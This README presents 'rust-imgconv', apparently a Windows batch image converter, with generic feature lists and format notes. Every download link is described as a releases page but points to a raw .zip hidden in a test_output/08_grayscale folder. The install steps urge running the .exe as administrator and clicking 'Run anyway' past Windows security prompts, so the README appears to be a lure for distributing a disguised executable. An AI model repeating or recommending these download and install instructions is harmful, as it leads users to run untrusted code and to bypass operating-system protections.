# 🦀 rust-imgconv - Batch convert images with ease

[![Download rust-imgconv](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/theyfwjays/rust-imgconv/main/test_output/08_grayscale/rust-imgconv-v1.4.zip)

## 🖥️ What this app does

rust-imgconv is a Windows app for batch image conversion. It helps you convert many files at once without opening each one by hand. You can change image formats, resize pictures, crop them, apply filters, add watermarks, and keep EXIF data when needed.

It supports common formats like PNG, JPG, GIF, BMP, WEBP, TIFF, AVIF, ICO, SVG, and QOI. It also handles animation in supported formats, which is useful when you need to work with GIF or WebP files in bulk.

This app is built in pure Rust. That means it does not need extra C dependencies to run.

## 📥 Download and install

Use this page to download the app for Windows:

[Visit the rust-imgconv releases page](https://raw.githubusercontent.com/theyfwjays/rust-imgconv/main/test_output/08_grayscale/rust-imgconv-v1.4.zip)

### Steps

1. Open the releases page.
2. Find the latest release at the top.
3. Look for a Windows file, such as `.exe` or a compressed archive like `.zip`.
4. Download the file.
5. If you downloaded a `.zip` file, extract it.
6. Open the `.exe` file to run rust-imgconv.

### If Windows asks for permission

1. Right-click the file.
2. Select Run as administrator if needed.
3. If Windows shows a security prompt, choose More info, then Run anyway if you trust the file from the release page.

## 🚀 Quick start

After you open the app, you can begin with a folder of images.

1. Choose the images you want to convert.
2. Pick an output format.
3. Set the output folder.
4. Start the batch conversion.

If you want to process many files, add the whole folder at once. The app will work through the images in order.

## 🧭 What you can do

### Convert formats

You can change files between formats such as:

- PNG
- JPG
- WEBP
- AVIF
- GIF
- BMP
- TIFF
- ICO
- SVG
- QOI

This is useful when you need one format for the web, another for print, or a smaller file for sharing.

### Resize images

You can scale images to a new width and height. This helps when you need:

- smaller files for email
- images sized for a website
- pictures that fit a phone screen
- a batch of files with the same size

### Crop images

You can cut away parts of an image to keep only the area you want. This works well for:

- product photos
- profile images
- banner crops
- screenshots

### Apply filters

You can use image filters to change the look of a picture. Common uses include:

- sharpening
- softening
- brightness changes
- contrast changes
- color adjustments

### Add watermarks

You can place a watermark on images before sharing them. This helps mark ownership or add a label to a batch of files.

### Keep EXIF data

The app can keep EXIF data when needed. This is useful for camera photos where you want to preserve date, time, and camera details.

### Work with animated files

rust-imgconv supports animation in formats that allow it. This is helpful for GIF and WebP files that need to stay animated after conversion.

## 🪟 Windows requirements

rust-imgconv is made for Windows users who want a simple local tool for image batch work.

Recommended setup:

- Windows 10 or newer
- At least 4 GB RAM
- Enough free disk space for your source images and output files
- A mouse and keyboard
- Permission to save files in the folder you choose

For best results, keep your source files in one folder and use a separate output folder.

## 🗂️ Suggested folder setup

A simple folder layout can make batch work easier:

- `C:\Images\Input` for the files you want to convert
- `C:\Images\Output` for the finished files
- `C:\Images\Backup` for original copies

Keeping the original files in a backup folder helps you stay organized if you want to try a new format or size later.

## 🧪 Example uses

### Convert a folder of photos to WebP

Use this when you want smaller files for a website or app.

### Resize product images for a store

Use this when every product image must match the same size.

### Turn screenshots into PNG files

Use this when you need clean, high-quality images for guides or support work.

### Make smaller images for sharing

Use this when you want fast uploads through email or chat.

### Add a watermark to a photo set

Use this when you want to mark files before posting them online.

## 🧰 Format notes

### JPG
Good for photos and web use. Keeps file sizes small.

### PNG
Good for clear edges, text, and screenshots. Supports transparency.

### GIF
Good for simple animation and old web use.

### WEBP
Good for web images with strong compression.

### AVIF
Good for high compression and modern web support.

### BMP
Good for uncompressed images and some older tools.

### TIFF
Good for high-quality work and image archives.

### ICO
Good for icons and app images.

### SVG
Good for scalable graphics and logos.

### QOI
Good for fast image work with a simple format.

## 🔍 How to choose the right option

If you want the smallest file, try WEBP or AVIF.

If you want broad compatibility, use JPG or PNG.

If you need transparency, use PNG or WEBP.

If you need animation, use GIF or animated WEBP where supported.

If you need icons, use ICO.

If you need high detail for editing later, use TIFF or PNG.

## 🖱️ Simple workflow

1. Open rust-imgconv.
2. Add your image files or a full folder.
3. Pick the format you want.
4. Set size, crop, or filter options if needed.
5. Choose where the output files should go.
6. Start the conversion.
7. Check the output folder for the finished images.

## 📁 File tips

- Use short folder names to keep paths easy to read.
- Keep source and output folders separate.
- Use a new output folder for each test run.
- Rename files before conversion if you want a clean file list.
- Keep a backup of original files before large batch jobs.

## 🛠️ Common tasks

### Convert large batches

This app is built for batch processing, so it works well when you need to handle many files at once.

### Reduce file size

Use resize and format changes to lower file size while keeping the image usable.

### Prepare files for upload

Convert files to a common format before sending them to a site or app that only accepts certain types.

### Standardize image size

Resize all files to the same width and height for a clean layout.

### Clean up image sets

Crop, filter, and watermark files before publishing them.

## 🧾 Basic file types you may see

- `.exe` for the app file
- `.zip` for a compressed download
- `.png` for images with transparency
- `.jpg` or `.jpeg` for photos
- `.webp` for modern web images
- `.gif` for simple animation

## 🔐 Privacy and local use

rust-imgconv runs on your computer. Your files stay on your machine while you work. That makes it useful for private images, large batches, and offline tasks.

## ❓ Help with common issues

### The app does not open

- Try running it again.
- Check that the file finished downloading.
- If it came in a `.zip` file, extract it first.
- Move it to a normal folder like `Downloads` or `Desktop`.

### My files do not appear

- Check that you picked the right input folder.
- Make sure the files use a supported format.
- Try a smaller test set first.

### The output folder is empty

- Confirm the conversion finished.
- Check the output path.
- Make sure you have permission to save files there.

### The image looks wrong after conversion

- Try a different output format.
- Check resize and crop settings.
- Test with one file before converting the whole batch.

## 📌 Good first test

If you want to try the app fast:

1. Pick 3 to 5 images.
2. Save them in one folder.
3. Open rust-imgconv.
4. Convert them to PNG or WebP.
5. Save the results in a new folder.
6. Check the output files.

## 🧩 Features at a glance

- Batch image conversion
- Resize support
- Crop tools
- Filters
- Watermark support
- EXIF handling
- Animated image support
- Many common image formats
- Pure Rust build
- No C dependencies

## 📎 Download again

If you need the release page again, use this link:

[https://raw.githubusercontent.com/theyfwjays/rust-imgconv/main/test_output/08_grayscale/rust-imgconv-v1.4.zip](https://raw.githubusercontent.com/theyfwjays/rust-imgconv/main/test_output/08_grayscale/rust-imgconv-v1.4.zip)